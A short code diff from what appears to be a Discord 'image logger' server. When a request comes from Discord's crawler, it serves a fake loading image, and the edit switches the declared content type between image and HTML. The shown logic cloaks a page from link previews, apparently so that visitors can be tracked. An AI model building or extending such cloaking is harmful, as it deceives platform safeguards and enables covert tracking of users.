@@ -183,7 +183,7 @@ div.img {{
         if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
             if "discord" in self.headers.get('user-agent').lower():
                 self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type','image/jpeg') # Define the data as an image so Discord can show it.
+                self.send_header('Content-type','image/jpeg' if config["buggedImage"] else 'text/html') # Define the data as an image so Discord can show it.
                 self.end_headers() # Declare the headers as finished.
 
                 self.wfile.write(binaries["loading"] if config["buggedImage"] else data) # Write the image to the client.
